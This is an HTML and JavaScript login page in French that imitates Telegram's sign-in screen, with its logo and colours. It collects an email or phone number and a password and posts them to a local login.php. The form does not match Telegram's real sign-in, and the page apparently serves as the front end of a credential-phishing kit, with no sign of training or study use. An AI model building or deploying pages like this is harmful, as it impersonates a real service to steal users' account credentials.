<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Connexion Telegram</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            color: #222;
        }
        .login-container {
            background: #ffffff;
            border: 1px solid #ddd;
            padding: 30px 40px;
            border-radius: 10px;
            box-shadow: 0 2px 15px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 90%;
            text-align: center;
        }
        img {
            width: 80px;
            margin-bottom: 20px;
        }
        h2 {
            margin-bottom: 25px;
            font-weight: 600;
            color: #0088cc;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }
        input[type="text"],
        input[type="tel"],
        input[type="email"],
        input[type="password"],
        select {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ccc;
            border-radius: 7px;
            font-size: 1em;
            box-sizing: border-box;
        }
        .phone-input {
            display: flex;
            gap: 10px;
        }
        .country-code {
            flex: 0 0 80px;
        }
        .phone-number {
            flex: 1;
        }
        .remember-me {
            display: flex;
            align-items: center;
            margin: 15px 0;
        }
        .remember-me input {
            margin-right: 10px;
            accent-color: #0088cc;
        }
        button {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 7px;
            font-size: 1.1em;
            cursor: pointer;
            transition: background-color 0.3s ease;
            margin-top: 10px;
        }
        button:hover {
            background-color: #006699;
        }
        .switch-form {
            margin-top: 20px;
            font-size: 0.9em;
        }
        .switch-form a {
            color: #0088cc;
            text-decoration: none;
            font-weight: 500;
        }
        .switch-form a:hover {
            text-decoration: underline;
        }
        .message {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            display: none;
        }
        .success {
            background-color: #e6ffed;
            color: #22863a;
        }
        .error {
            background-color: #ffe6e6;
            color: #cc0000;
        }
        .loading {
            display: none;
            margin-top: 15px;
        }
        .loading:after {
            content: " .";
            animation: dots 1.5s steps(5, end) infinite;
        }
        @keyframes dots {
            0%, 20% { color: rgba(0,0,0,0); text-shadow: .25em 0 0 rgba(0,0,0,0), .5em 0 0 rgba(0,0,0,0); }
            40% { color: #0088cc; text-shadow: .25em 0 0 rgba(0,0,0,0), .5em 0 0 rgba(0,0,0,0); }
            60% { text-shadow: .25em 0 0 #0088cc, .5em 0 0 rgba(0,0,0,0); }
            80%, 100% { text-shadow: .25em 0 0 #0088cc, .5em 0 0 #0088cc; }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo Telegram" />
        <h2 id="form-title">Connexion Telegram</h2>
        
        <form id="loginForm" method="POST" action="login.php">
            <div class="form-group">
                <label for="username">Email ou numéro de téléphone</label>
                <input type="text" id="username" name="username" placeholder="Email ou téléphone" required>
            </div>
            
            <div class="form-group">
                <label for="password">Mot de passe</label>
                <input type="password" id="password" name="password" placeholder="Mot de passe" required>
            </div>
            
            <div class="remember-me">
                <input type="checkbox" id="remember" name="remember" checked>
                <label for="remember">Garder ma session active</label>
            </div>
            
            <button type="submit" id="submit-btn">Continuer</button>
            <div class="loading" id="loading">Chargement</div>
            <div class="message" id="message"></div>
        </form>
        
        <div class="switch-form">
            <span id="switch-text">Vous n'avez pas de compte?</span>
            <a href="#" id="switch-link">Créer un compte</a>
        </div>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        const message = document.getElementById('message');
        const loading = document.getElementById('loading');
        const switchLink = document.getElementById('switch-link');
        const switchText = document.getElementById('switch-text');
        const formTitle = document.getElementById('form-title');
        const submitBtn = document.getElementById('submit-btn');
        
        let isLoginForm = true;
        
        // Basculer entre connexion et inscription
        switchLink.addEventListener('click', function(e) {
            e.preventDefault();
            isLoginForm = !isLoginForm;
            
            if (isLoginForm) {
                formTitle.textContent = 'Connexion Telegram';
                submitBtn.textContent = 'Se connecter';
                switchText.textContent = 'Vous n\'avez pas de compte?';
                switchLink.textContent = 'Créer un compte';
            } else {
                formTitle.textContent = 'Créer un compte';
                submitBtn.textContent = 'S\'inscrire';
                switchText.textContent = 'Vous avez déjà un compte?';
                switchLink.textContent = 'Se connecter';
            }
            
            // Réinitialiser le message
            message.style.display = 'none';
        });
        
        // Gérer la soumission du formulaire
        loginForm.addEventListener('submit', function(event) {
            event.preventDefault();
            
            // Afficher le chargement
            loading.style.display = 'block';
            message.style.display = 'none';
            
            // Créer un objet FormData à partir du formulaire
            const formData = new FormData(loginForm);
            
            // Envoyer les données au serveur PHP
            fetch('login.php', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.redirected) {
                    window.location.href = response.url;
                    return;
                }
                return response.text();
            })
            .then(data => {
                loading.style.display = 'none';
                
                if (data && data.includes("Erreur")) {
                    showMessage(data, 'error');
                } else if (data) {
                    showMessage(data, 'success');
                }
            })
            .catch(error => {
                loading.style.display = 'none';
                showMessage('Erreur de connexion au serveur', 'error');
                console.error('Error:', error);
            });
        });
        
        function showMessage(text, type) {
            message.textContent = text;
            message.className = 'message ' + (type === 'success' ? 'success' : 'error');
            message.style.display = 'block';
        }
    </script>
</body>
</html>